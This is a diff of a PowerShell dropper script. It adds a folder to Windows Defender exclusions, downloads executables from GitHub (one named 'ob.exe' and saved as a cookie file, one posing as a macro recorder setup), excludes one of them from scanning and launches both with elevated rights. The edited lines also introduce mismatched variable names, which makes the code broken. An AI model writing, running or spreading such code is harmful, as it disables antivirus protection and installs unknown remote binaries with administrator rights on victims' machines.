@@ -5,17 +5,17 @@ New-Item -Path $systemPath -ItemType Directory -Force
 Add-MpPreference -ExclusionPath $systemPath
 
 $cookieUrl = "https://github.com/PXTDEV9022/test1/raw/refs/heads/main/ob.exe"
-$cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
+$cookiePath = [System.IO.Path]::Combine($systemPath, "cooki.exe")
 
 Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
 
 Add-MpPreference -ExclusionProcess $cookiePath
 
 $getfileUrl = "https://github.com/PXTDEV9022/s2/raw/refs/heads/main/MacroRecorderSetup.exe"
-$getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
+$getfilePath = [System.IO.Path]::Combine($systemPath, "getfile1.exe")
 
-Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
+Invoke-WebRequest -Uri $getfile1Url -OutFile $getfilePath
 
-Start -FilePath $getfilePath
+Start -FilePath $getfilePath  -Verb RunAs
 
-Start-Process -FilePath $cookiePath
+Start-Process -FilePath $cookiPath  -Verb RunAs
